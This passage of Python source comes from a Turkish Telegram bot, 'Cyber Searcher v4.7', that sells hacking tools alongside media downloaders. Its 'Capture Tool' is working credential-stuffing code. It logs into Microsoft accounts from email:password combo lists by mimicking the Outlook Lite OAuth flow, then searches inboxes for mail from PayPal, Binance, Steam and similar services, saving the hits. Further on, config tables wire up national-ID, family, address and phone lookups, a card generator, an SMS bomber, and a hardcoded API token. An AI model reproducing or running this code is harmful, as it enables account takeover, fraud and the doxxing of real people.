            "📌 <b>Kullanım:</b>\n"
            "<code>/sarki Sanatçı Şarkı</code>\n"
            "<code>/sarki https://youtube.com/...</code>",
            parse_mode="HTML")
        return
    sorgu = parts[1].strip()
    durum = bot_instance.reply_to(msg, f"🔍 <code>{esc(sorgu)}</code> aranıyor...", parse_mode="HTML")
    try:
        bot_instance.edit_message_text(
            f"🎧 <b>İndiriliyor...</b>\n<code>{esc(sorgu)}</code>",
            msg.chat.id, durum.message_id, parse_mode="HTML")
        result = _muzik_indir(sorgu)
        if not result["ok"]:
            bot_instance.edit_message_text(result.get("error","❌ Bilinmeyen hata!"),
                                           msg.chat.id, durum.message_id, parse_mode="HTML")
            return
        baslik = result["title"]; sanatci = result["uploader"]
        sure = result["duration"]; sure_txt = f"{int(sure//60)}:{int(sure%60):02d}" if sure else "?"
        thumb_path = None
        if result.get("thumbnail"):
            try:
                td = requests.get(result["thumbnail"], timeout=10, verify=False).content
                thumb_path = f"muzikler/thumb_{uid}_{int(time.time())}.jpg"
                with open(thumb_path, "wb") as f: f.write(td)
            except: thumb_path = None
        ext = os.path.splitext(result["path"])[1].replace(".","") or "m4a"
        caption = (f"🎵 <b>{esc(baslik)}</b>\n"
                   f"━━━━━━━━━━━━━━━━━━━━━\n"
                   f"👤 <b>Sanatçı:</b> {esc(sanatci)}\n"
                   f"⏱ <b>Süre:</b> {sure_txt}\n"
                   f"💽 <b>Format:</b> .{ext}\n"
                   f"🔗 <a href='{result['url']}'>YouTube'da Aç</a>")
        with open(result["path"], "rb") as sarki:
            thumb_file = open(thumb_path, "rb") if thumb_path and os.path.exists(thumb_path) else None
            try:
                bot_instance.send_audio(msg.chat.id, sarki, caption=caption,
                                        title=baslik[:60], performer=sanatci[:60],
                                        duration=int(sure) if sure else 0, thumb=thumb_file,
                                        parse_mode="HTML")
            finally:
                if thumb_file: thumb_file.close()
                try: os.remove(result["path"])
                except: pass
                if thumb_path and os.path.exists(thumb_path):
                    try: os.remove(thumb_path)
                    except: pass
        try: bot_instance.delete_message(msg.chat.id, durum.message_id)
        except: pass
    except Exception as e:
        print(f"[MUSIC ERROR] {e}")
        try: bot_instance.edit_message_text(f"❌ <b>Hata:</b> <code>{esc(e)}</code>", msg.chat.id, durum.message_id, parse_mode="HTML")
        except: bot_instance.reply_to(msg, f"❌ Hata: {esc(e)}", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  🎥 VİDEO
# ══════════════════════════════════════════════════════════════
def _download_video(link):
    os.makedirs("downloads", exist_ok=True)
    ydl_opts = _ytdlp_common_opts()
    ydl_opts.update({
        "format": "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best",
        "outtmpl": os.path.join("downloads", "%(id)s.%(ext)s"),
        "max_filesize": 50 * 1024 * 1024,
    })
    try:
        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(link, download=True)
            if "requested_downloads" in info and info["requested_downloads"]:
                path = info["requested_downloads"][0]["filepath"]
            else:
                path = ydl.prepare_filename(info)
            if not os.path.exists(path):
                base, _ = os.path.splitext(path)
                for ext in [".mp4", ".mkv", ".webm"]:
                    if os.path.exists(base + ext):
                        path = base + ext; break
            if not os.path.exists(path):
                return {"ok": False, "err": "İndirilen video dosyası bulunamadı."}
            size = os.path.getsize(path)
            if size > 50 * 1024 * 1024:
                os.remove(path)
                return {"ok": False, "err": f"Video boyutu ({size / (1024*1024):.1f}MB) 50MB limitini aşıyor."}
            return {"ok": True, "path": path, "title": info.get("title", "Video"),
                    "size": f"{size / (1024 * 1024):.1f}MB", "dur": info.get("duration", "?"),
                    "upl": info.get("uploader", "?")}
    except Exception as e:
        return {"ok": False, "err": esc(e)}

def _process_video(msg, bot_instance):
    uid = msg.from_user.id
    link = msg.text.strip()
    if not link.startswith(("http://", "https://")):
        bot_instance.reply_to(msg, "❌ Geçerli bir link gir!", parse_mode="HTML")
        return
    sm = bot_instance.reply_to(msg, "⏳ İndiriliyor...", parse_mode="HTML")
    res = _download_video(link)
    if not res["ok"]:
        bot_instance.edit_message_text(f"❌ İndirilemedi:\n<code>{esc(res['err'])}</code>", msg.chat.id, sm.message_id, parse_mode="HTML")
        return
    cap = f"🎥 <b>{esc(res['title'][:60])}</b>\n📦 {res['size']}  ⏱ {res['dur']}s  👤 {esc(res['upl'])}"
    try:
        with open(res["path"], "rb") as f:
            bot_instance.send_video(msg.chat.id, f, caption=cap, supports_streaming=True, timeout=120, parse_mode="HTML")
    except Exception as e:
        bot_instance.edit_message_text(f"❌ Gönderme hatası: {esc(e)}", msg.chat.id, sm.message_id, parse_mode="HTML")
    finally:
        if os.path.exists(res["path"]): os.remove(res["path"])
        try: bot_instance.delete_message(msg.chat.id, sm.message_id)
        except: pass

# ══════════════════════════════════════════════════════════════
#  CAPTURE TOOL
# ══════════════════════════════════════════════════════════════
CAPTURE_APPS = {
    1:'security@facebookmail.com', 2:'security@mail.instagram.com', 3:'noreply@pubgmobile.com',
    4:'nintendo-noreply@ccg.nintendo.com', 5:'register@account.tiktok.com', 6:'info@x.com',
    7:'service@paypal.com.br', 8:'do-not-reply@ses.binance.com', 9:'info@account.netflix.com',
    10:'reply@txn-email.playstation.com', 11:'noreply@id.supercell.com', 12:'help@acct.epicgames.com',
    13:'no-reply@spotify.com', 14:'noreply@rockstargames.com', 15:'xboxreps@engage.xbox.com',
    16:'account-security-noreply@accountprotection.microsoft.com', 17:'noreply@steampowered.com',
    18:'accounts@roblox.com', 19:'EA@e.ea.com', 20:'no-reply@bitkub.com'
}
CAPTURE_NAMES = {
    1:"Facebook",2:"Instagram",3:"PUBG",4:"Konami",5:"TikTok",6:"Twitter",7:"PayPal",8:"Binance",
    9:"Netflix",10:"PlayStation",11:"Supercell",12:"Epic Games",13:"Spotify",14:"Rockstar",15:"Xbox",
    16:"Microsoft",17:"Steam",18:"Roblox",19:"EA Sports",20:"Bitkub"
}
CAPTURE_KEYWORDS = list(CAPTURE_NAMES.values())
CAPTURE_RUNNING = False
CAPTURE_LOCK = threading.Lock()
CAPTURE_RESULTS = {}
CAPTURE_HIT = 0; CAPTURE_BAD = 0; CAPTURE_PROCESSED = 0

def capture_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    is_prem = is_premium(user_id)
    mk.add(_sep("📸 PLATFORM SEÇİNİZ"))
    if is_prem: mk.add(_btn("📸 Tüm Platformlar ⭐", "capture_all"))
    else: mk.add(_btn("📸 Tüm Platformlar 🔒 (Premium)", "noop"))
    for i in range(1, 21, 2):
        if i + 1 <= 20:
            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"),
                   _btn(f"{i+1}. {CAPTURE_NAMES[i+1]}", f"capture_{i+1}"))
        else:
            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"))
    if not is_prem:
        mk.add(_sep(f"📊 Kalan Hakkınız: {get_capture_limit_text(user_id)}/{FREE_CAPTURE_LIMIT}"))
        mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn("◀️ Geri", "goto_hotmail"))
    return mk

def capture_get_token(email, password):
    try:
        headers = {
            "Connection":"keep-alive","Upgrade-Insecure-Requests":"1",
            "User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "return-client-request-id":"false","client-request-id":"205740b4-7709-4500-a45b-b8e12f66c738",
            "x-ms-sso-ignore-sso":"1","correlation-id":str(uuid.uuid4()),
            "x-client-ver":"1.1.0+9e54a0d1","x-client-os":"28",
            "x-client-sku":"MSAL.xplat.android","x-client-src-sku":"MSAL.xplat.android",
            "X-Requested-With":"com.microsoft.outlooklite",
            "Sec-Fetch-Site":"none","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document",
            "Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9",
        }
        response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
        cookies = response.cookies.get_dict()
        url = response.text.split("urlPost:'")[1].split("'")[0]
        ppft = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        ad = response.url.split('haschrome=1')[0]
        data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        login_headers = {
            "Host":"login.live.com","Connection":"keep-alive","Content-Length":str(len(data)),
            "Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1",
            "Origin":"https://login.live.com","Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "X-Requested-With":"com.microsoft.outlooklite",
            "Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document",
            "Referer":f"{ad}haschrome=1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9",
            "Cookie":f"MSPRequ={cookies['MSPRequ']};uaid={cookies['uaid']}; RefreshTokenSso={cookies['RefreshTokenSso']}; MSPOK={cookies['MSPOK']}; OParams={cookies['OParams']}; MicrosoftApplicationsTelemetryDeviceId={uuid}"
        }
        res = requests.post(url, data=data, headers=login_headers, allow_redirects=False)
        cookies = res.cookies.get_dict()
        headers = res.headers
        if any(key in cookies for key in ["JSH","JSHP","ANON","WLSSC"]) or res.text == '':
            code = headers.get('Location','').split('code=')[1].split('&')[0] if 'code=' in headers.get('Location','') else None
            cid = cookies.get('MSPCID','').upper()
            if code and cid:
                token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                token_data = {"client_info":"1","client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                              "redirect_uri":"msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                              "grant_type":"authorization_code","code":code,
                              "scope":"profile openid offline_access https://outlook.office.com/M365.Access"}
                token_res = requests.post(token_url, data=token_data, headers={"Content-Type":"application/x-www-form-urlencoded"})
                access_token = token_res.json().get("access_token")
                return access_token, cid
        return None, None
    except: return None, None

def capture_get_info(email, password, token, cid, target_app=None):
    try:
        headers = {"User-Agent":"Outlook-Android/2.0","Pragma":"no-cache","Accept":"application/json",
                   "ForceSync":"false","Authorization":f"Bearer {token}","X-AnchorMailbox":f"CID:{cid}",
                   "Host":"substrate.office.com","Connection":"Keep-Alive","Accept-Encoding":"gzip"}
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers).json()
        name = r.get('names',[{}])[0].get('displayName','Bilinmiyor')
        location = r.get('accounts',[{}])[0].get('location','Bilinmiyor')
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers2 = {"Host":"outlook.live.com","content-length":"0","x-owa-sessionid":f"{cid}",
                    "x-req-source":"Mini","authorization":f"Bearer {token}",
                    "user-agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                    "action":"StartupData","x-owa-correlationid":f"{cid}","ms-cv":"YizxQK73vePSyVZZXVeNr+.3",
                    "content-type":"application/json; charset=utf-8","accept":"*/*",
                    "origin":"https://outlook.live.com","x-requested-with":"com.microsoft.outlooklite",
                    "sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty",
                    "referer":"https://outlook.live.com/","accept-encoding":"gzip, deflate",
                    "accept-language":"en-US,en;q=0.9"}
        rese = requests.post(url, headers=headers2, data="").text
        found_apps = []
        for num, app_mail in CAPTURE_APPS.items():
            if app_mail in rese: found_apps.append(CAPTURE_NAMES[num])
        return {"success":True,"name":name,"country":location,"apps":found_apps,"email":email,"password":password}
    except: return {"success": False}

def capture_worker(line, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
    try:
        if ":" not in line:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        email, password = line.split(":", 1)
        email = email.strip(); password = password.strip()
        if not email or not password:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        token, cid = capture_get_token(email, password)
        if not token or not cid:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        result = capture_get_info(email, password, token, cid, target_app)
        if result.get("success"):
            apps = result.get("apps", [])
            if target_app:
                target_name = None
                for num, app_mail in CAPTURE_APPS.items():
                    if app_mail == target_app:
                        target_name = CAPTURE_NAMES[num]; break
                if target_name and target_name not in apps:
                    with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
                    return
            with CAPTURE_LOCK:
                CAPTURE_HIT += 1
                if user_id not in CAPTURE_RESULTS: CAPTURE_RESULTS[user_id] = []
                CAPTURE_RESULTS[user_id].append(result)
            with open(f"capture_hits_{user_id}.txt", "a", encoding="utf-8") as f:
                f.write(f"Email: {email}\nPassword: {password}\nName: {result.get('name')}\n"
                        f"Country: {result.get('country')}\nApps: {', '.join(apps)}\n{'-'*40}\n")
        else:
            with CAPTURE_LOCK: CAPTURE_BAD += 1
    except:
        with CAPTURE_LOCK: CAPTURE_BAD += 1
    finally:
        with CAPTURE_LOCK: CAPTURE_PROCESSED += 1

def start_capture_scan(combo_list, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_RUNNING, CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
    with CAPTURE_LOCK:
        CAPTURE_RUNNING = True; CAPTURE_HIT = 0; CAPTURE_BAD = 0
        CAPTURE_PROCESSED = 0; CAPTURE_RESULTS[user_id] = []
    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for line in combo_list[:1000]:
                futures.append(executor.submit(capture_worker, line, user_id, user_name, is_premium, target_app))
            for future in as_completed(futures):
                try: future.result()
                except: pass
    finally:
        with CAPTURE_LOCK: CAPTURE_RUNNING = False

# ══════════════════════════════════════════════════════════════
#  LANGUAGE
# ══════════════════════════════════════════════════════════════
def lang(user_id):
    l = db_get(user_id, "language")
    return l if l in ("tr", "en", "ar") else "tr"

def s(user_id, key, **kw):
    l = lang(user_id)
    txt = S.get(l, S["tr"]).get(key, key)
    return txt.format(**kw) if kw else txt

S = {
    "tr": {
        "welcome": "🌟 <b>Cyber Searcher v4.7</b>\nHoşgeldin, <b>{name}</b>!\n📌 Durum: {status}\n🔻 Aşağıdan işlem seç:",
        "free": "🆓 Ücretsiz", "premium": "⭐ PREMIUM",
        "select_op": "🛠 Kullanmak istediğin aracı seç:",
        "combo_ask": "🌐 Domain gir (Örn: netflix.com) veya (netflix.com 100):",
        "searching": "🔍 <b>{domain}</b> taranıyor...",
        "no_result": "❌ {domain} için sonuç bulunamadı.",
        "combo_caption": "✅ <b>{domain}</b> | <b>{count}</b> Hesap\nAPI: {apis}",
        "stats_title": "📊 <b>İSTATİSTİKLERİN</b>",
        "lb_title": "🏆 <b>LİDER TABLOSU</b>",
        "no_stats": "📊 Henüz hiç sorgu yapmadınız!",
        "api_title": "⚙️ <b>API DEĞİŞTİR</b>\n📌 Mevcut: <b>{cur}</b>",
        "lang_pick": "🌍 Dil seçin / Select language / اختر لغتك",
        "lang_ok": "✅ Dil seçildi!",
        "premium_title": "⭐ <b>PREMIUM ÜYELİK</b>",
        "premium_price_txt": "💰 Fiyat: <b>{price} Telegram Yıldızı</b>",
        "premium_dur": "♾️ Süre: <b>Sınırsız (Ömür Boyu)</b>",
        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n• 📧 Sınırsız Hotmail Check\n• 📸 Sınırsız Capture\n• 🔖 Sınırsız Keyword\n• 🌍 Sınırsız OSINT\n• 🆔 Sınırsız TG-ID\n• 🎨 Sınırsız AI Image",
        "osint_price": "💰 OSINT Premium: 200 Yıldız",
        "already_premium": "⭐ Zaten Premium üyesiniz!",
        "back_btn": "◀️ Geri", "home_btn": "🏠 Ana Menü", "tools_btn": "🛠 Araçlar",
        "video_ask": "🎥 Video linkini gönder:",
        "video_wait": "⏳ İndiriliyor...",
        "video_err": "❌ İndirilemedi:\n<code>{err}</code>",
        "video_caption": "🎥 <b>{title}</b>\n📦 {size}  ⏱ {dur}s  👤 {upl}",
        "invalid_link": "❌ Geçerli bir link gir!",
        "ls_ask": "{icon} <b>LeakSights — {tool}</b>\n📥 Sorgu değerini gir:",
        "ls_caption": "📋 LeakSights ⭐\n🔍 Aranan: <code>{val}</code>",
        "tr_ask": "{prompt}\n📌 Sonuç TXT olarak gelir.",
        "tr_caption": "📋 {tool} Sorgu\n🔍 Param: <code>{param}</code>",
        "processing": "🔄 Sorgulanıyor...",
        "admin_only": "❌ Bu komut sadece admin içindir!",
        "user_nf": "❌ Kullanıcı bulunamadı!",
        "enter_val": "Değeri gir:",
        "invalid_tc": "❌ Geçersiz TC (11 haneli sayı olmalı)!",
        "invalid_gsm": "❌ Geçersiz GSM (10 haneli)!",
        "invalid_adsoyad": "❌ Ad ve Soyad gir!",
        "invalid_adaparsel": "❌ İl,İlçe formatında gir!",
        "multi_bot_list": "🤖 <b>BOT LİSTESİ</b>",
        "multi_bot_running": "🟢 Çalışıyor", "multi_bot_stopped": "🔴 Durduruldu",
        "multi_bot_total": "📊 Toplam: {count} bot",
        "multi_bot_added": "✅ Bot başlatıldı!\n🔑 Token: <code>{token}</code>\n👤 Sahip: {owner}",
        "multi_bot_exists": "⚠️ Bu token zaten çalışıyor!",
        "multi_bot_no_bots": "📭 Hiç bot kaydı bulunamadı.",
        "multi_bot_add_usage": "❌ Kullanım: /addbot BOT_TOKEN",
        "php2py": "🐍 PHP'den Python'a Çevirici\nBana bir PHP dosyası gönder, Python'a çevireyim.",
        "help_content": (
            "📖 <b>YARDIM MENÜSÜ (v4.7)</b>\n"
            "📌 Durumunuz: {status}\n"
            "══════════════════════\n"
            "🔹 <b>SORGU SİSTEMLERİ</b> (🆓 ÜCRETSİZ):\n"
            "   • 🆔 TC Sorgu • 🔍 TC Pro\n"
            "   • 👤 Ad Soyad • 👨‍👩‍👧 Aile • 🌳 Sülale\n"
            "   • 📱 TC→GSM • 📞 GSM→TC\n"
            "   • 🎓 E-Okul • 🏠 Tapu • 🗺️ Ada Parsel • 🏠 Adres\n"
            "🔹 <b>🆔 TELEGRAM ID SORGU</b>:\n"
            "   • 🆓 Free: 5 sorgu\n"
            "   • 💰 Paket: 25→89⭐ / 50→180⭐ / 100→250⭐\n"
            "   • ⭐ Premium: Sınırsız\n"
            "🔹 <b>🎨 AI IMAGE GENERATOR</b>:\n"
            "   • 🆓 Free: 2 hak\n"
            "   • 💎 Paket: 25→89⭐ / 50→200⭐ / 250→600⭐\n"
            "   • ⭐ Premium: Sınırsız\n"
            "   • 📸 Fotoğraf gönder → AI dönüştürsün!\n"
            "🔹 <b>⭐ PREMIUM PAKETLER:</b>\n"
            "   • 🌟 Premium (400⭐) → Sınırsız Hotmail + Capture + Keyword + TG-ID + AI\n"
            "   • 🌍 OSINT Premium (200⭐) → LeakSights OSINT (30+)\n"
            "🔹 <b>DİĞER ARAÇLAR</b>:\n"
            "   • 📦 Combo • 🎥 Video • 🎵 Müzik\n"
            "   • 💳 CC Gen • 🤖 DC/TG Token • 🌐 IP • 🔎 DNS\n"
            "   • 💣 SMS Bomber • 📧 Hotmail • 📸 Capture • 📸 EXIF\n"
            "👨‍💻 coded by: @hackledin"
        ),
    },
    "en": {
        "welcome": "🌟 <b>Cyber Searcher v4.7</b>\nWelcome, <b>{name}</b>!\n📌 Status: {status}",
        "free": "🆓 Free", "premium": "⭐ PREMIUM",
        "osint_price": "💰 OSINT Premium: 200 Stars",
        "help_content": "📖 <b>HELP (v4.7)</b>\n📌 Status: {status}\n🔹 Premium • 🆔 TG-ID • 🎨 AI\n👨‍💻 @hackledin",
    },
    "ar": {
        "welcome": "🌟 <b>Cyber Searcher v4.7</b>\nمرحباً، <b>{name}</b>!\n📌 الحالة: {status}",
        "free": "🆓 مجاني", "premium": "⭐ بريميوم",
        "osint_price": "💰 OSINT بريميوم: 200 نجمة",
        "help_content": "📖 <b>قائمة المساعدة (v4.7)</b>\n📌 حالتك: {status}\n👨‍💻 @hackledin",
    },
}

# ══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════
def main_kb(user_id):
    l = lang(user_id)
    labels = {
        "tr": ["📦 Combo Çek", "🛠 Araçlar", "📊 İstatistik", "👤 Profil", "🏆 Lider Tablosu", "⚙️ API Değiştir", "❓ Yardım"],
        "en": ["📦 Combo", "🛠 Tools", "📊 Stats", "👤 Profile", "🏆 Leaderboard", "⚙️ API", "❓ Help"],
        "ar": ["📦 كومبو", "🛠 الأدوات", "📊 الإحصائيات", "👤 الملف الشخصي", "🏆 المتصدرون", "⚙️ API", "❓ مساعدة"],
    }
    btns = labels.get(l, labels["tr"])
    mk = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    mk.add(*[KeyboardButton(b) for b in btns])
    return mk

def _btn(txt, cd): return InlineKeyboardButton(txt, callback_data=cd)
def _sep(txt): return InlineKeyboardButton(f"─── {txt} ───", callback_data="noop")

def hotmail_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    keywords = get_user_keywords(user_id)
    limit_text = get_keyword_limit_text(user_id)
    is_prem = is_premium(user_id)
    mk.add(_sep("📧 HOTMAIL CHECKER"))
    if is_prem: mk.add(_btn("🚀 Hotmail Tarama Başlat ⭐", "hotmail_start"))
    else: mk.add(_btn("📧 Hotmail Tarama (3000 satır)", "hotmail_start"))
    mk.add(_sep(f"🔖 KEYWORDLER ({len(keywords)}/{limit_text})"))
    for kw in keywords[:10]: mk.add(_btn(f"📌 {kw}", "noop"))
    mk.add(_btn("➕ Keyword Ekle", "hotmail_addkw"))
    mk.add(_btn("🗑️ Keyword Sil", "hotmail_delkw"))
    mk.add(_btn("🔄 Keywordleri Sıfırla", "hotmail_resetkw"))
    mk.add(_sep("📸 CAPTURE TOOL"))
    if is_prem: mk.add(_btn("📸 Capture Tarama Başlat ⭐", "capture_menu"))
    else:
        capture_left = get_capture_limit_text(user_id)
        mk.add(_btn(f"📸 Capture Tool ({capture_left} kullanım)", "capture_menu"))
    if is_prem: mk.add(_btn("⭐ Premium Aktif ✅", "noop"))
    else: mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
    return mk

API_LIST = [
    {"name": "Wazely API", "url": "https://wazely.vercel.app/api/trlog?site=", "type": "wazely"},
    {"name": "Solidar API", "url": "https://solidarksystems.alwaysdata.net/log.php?url=", "type": "solidar"},
    {"name": "RootTurkey API", "url": "https://rootturkey.xyz/log?url=", "type": "rootturkey"},
]
YASAKLI = [".gov", ".edu", "cheatglobal", "spin", "bet"]

TURKIYE_API = {
    "tc": {"url": "https://ajaxsystems.fun/tc.php?tc={tc}", "icon": "🆔", "tr": "TC Sorgu", "en": "TC Query", "ar": "استعلام TC"},
    "tcpro": {"url": "https://ajaxsystems.fun/tcpro.php?tc={tc}", "icon": "🔍", "tr": "TC Pro Sorgu", "en": "TC Pro", "ar": "TC Pro"},
    "adsoyad": {"url": "https://ajaxsystems.fun/adsoyad.php?ad={ad}&soyad={soyad}", "icon": "👤", "tr": "Ad Soyad", "en": "Name", "ar": "الاسم"},
    "aile": {"url": "https://ajaxsystems.fun/aile.php?tc={tc}", "icon": "👨‍👩‍👧", "tr": "Aile Sorgu", "en": "Family", "ar": "العائلة"},
    "ailepro": {"url": "https://ajaxsystems.fun/ailepro.php?tc={tc}", "icon": "👨‍👩‍👧‍👦", "tr": "Aile Pro", "en": "Family Pro", "ar": "العائلة Pro"},
    "sulale": {"url": "https://ajaxsystems.fun/sulale.php?tc={tc}", "icon": "🌳", "tr": "Sülale Sorgu", "en": "Lineage", "ar": "النسب"},
    "tcgsm": {"url": "https://ajaxsystems.fun/tcgsm.php?tc={tc}&auth=fire", "icon": "📱", "tr": "TC → GSM", "en": "TC to GSM", "ar": "TC إلى GSM"},
    "gsmtc": {"url": "https://ajaxsystems.fun/gsmtc.php?gsm={gsm}&auth=fire", "icon": "📞", "tr": "GSM → TC", "en": "GSM to TC", "ar": "GSM إلى TC"},
    "eokul": {"url": "https://ajaxsystems.fun/eokul.php?tc={tc}", "icon": "🎓", "tr": "E-Okul Sorgu", "en": "E-School", "ar": "المدرسة"},
    "tapu": {"url": "https://ajaxsystems.fun/tapu.php?tc={tc}", "icon": "🏠", "tr": "Tapu Sorgu", "en": "Title Deed", "ar": "الملكية"},
    "adaparsel": {"url": "https://ajaxsystems.fun/adaparsel.php?il={il}&ilce={ilce}", "icon": "🗺️", "tr": "Ada Parsel", "en": "Block Parcel", "ar": "القطعة"},
    "adres": {"url": "https://apiv2.ajaxsystems.fun/adres.php?tc={tc}", "icon": "🏠", "tr": "Adres Sorgu", "en": "Address", "ar": "العنوان"},
}

LS_TOKEN = "NHLpkXyN8Lq3AkkjA5yECyMu5lpA0l0GqnY0Co8kBwh9eIeOJg"
LS_BASE = "https://api.leaksights.com/osint"

def _lsurl(endpoint):
    return f"{LS_BASE}/{endpoint}?token={LS_TOKEN}&text={{value}}"

LEAKSIGHTS_API = {
    "username": {"url": _lsurl("username"), "icon": "👤", "cat": "username", "tr": "Kullanıcı Adı", "en": "Username", "ar": "المستخدم"},
    "email": {"url": _lsurl("email"), "icon": "📧", "cat": "contact", "tr": "E-posta", "en": "Email", "ar": "البريد"},
    "number": {"url": _lsurl("number"), "icon": "📱", "cat": "contact", "tr": "Telefon", "en": "Phone", "ar": "الهاتف"},
    "ip": {"url": _lsurl("ip"), "icon": "🌐", "cat": "ip", "tr": "IP Sızıntı", "en": "IP Leak", "ar": "IP"},
    "ipgeo": {"url": _lsurl("ipgeo"), "icon": "📍", "cat": "ip", "tr": "IP Konum", "en": "IP Location", "ar": "موقع IP"},
    "hwid": {"url": _lsurl("hwid"), "icon": "💻", "cat": "ip", "tr": "HWID", "en": "HWID", "ar": "HWID"},
    "url": {"url": _lsurl("url"), "icon": "🔗", "cat": "url", "tr": "URL Sızıntı", "en": "URL Leak", "ar": "URL"},
    "cpf": {"url": _lsurl("cpf"), "icon": "🆔", "cat": "identity", "tr": "CPF", "en": "CPF", "ar": "CPF"},
    "password": {"url": _lsurl("password"), "icon": "🔑", "cat": "other", "tr": "Şifre", "en": "Password", "ar": "كلمة المرور"},
    "placa": {"url": _lsurl("placa"), "icon": "🚗", "cat": "other", "tr": "Plaka", "en": "Plate", "ar": "اللوحة"},
}

LEAKSIGHTS_CATS = {
    "username": {"tr": "👤 KULLANICI ADI", "en": "👤 USERNAME", "ar": "👤 المستخدم"},
    "contact": {"tr": "📱 İLETİŞİM", "en": "📱 CONTACT", "ar": "📱 الاتصال"},
    "ip": {"tr": "🌐 IP / AĞ", "en": "🌐 IP", "ar": "🌐 IP"},
    "url": {"tr": "🔗 URL", "en": "🔗 URL", "ar": "🔗 URL"},
    "identity": {"tr": "🛂 KİMLİK", "en": "🛂 ID", "ar": "🛂 الهوية"},
    "other": {"tr": "🔧 DİĞER", "en": "🔧 OTHER", "ar": "🔧 أخرى"},
}

TOOLS_API = {
    "bedrock": "https://wazelyapi.vercel.app/api/bedrock?adres=",
    "ccgen": "https://wazelyapi.vercel.app/api/ccgen?bin=",
    "dctoken": "https://wazelyapi.vercel.app/api/dcbottokencheck?token=",
    "tgtoken": "https://wazelyapi.vercel.app/api/tgtokencheck?token=",
    "eczane": "https://wazely.vercel.app/api/eczane?ad=",
    "ipinfo": "https://wazely.vercel.app/api/ipinfo?ip=",
    "dns": "https://wazely.vercel.app/api/dns?domain=",
    "bahis": "https://wazely.vercel.app/api/bahis?isimsoyisim=",
    "plaka": "https://wazely.vercel.app/api/plaka?plate=",
    "predunyam": "https://wazely.vercel.app/api/predunyam",
}

TOOL_PROMPTS = {
    "tr": {
        "bedrock": "🎮 IP:PORT girin:", "ccgen": "💳 BIN girin:",
        "dctoken": "🤖 Discord Bot Token girin:", "tgtoken": "✈️ Telegram Bot Token girin:",
        "eczane": "💊 Eczane adını girin:", "ipinfo": "🌐 IP Adresini girin:",
        "dns": "🔎 Domain girin:", "bahis": "⚽ İsim Soyisim girin:",
        "plaka": "🚗 Plaka girin:", "proxycheck": "🛡️ IP adresini girin:",
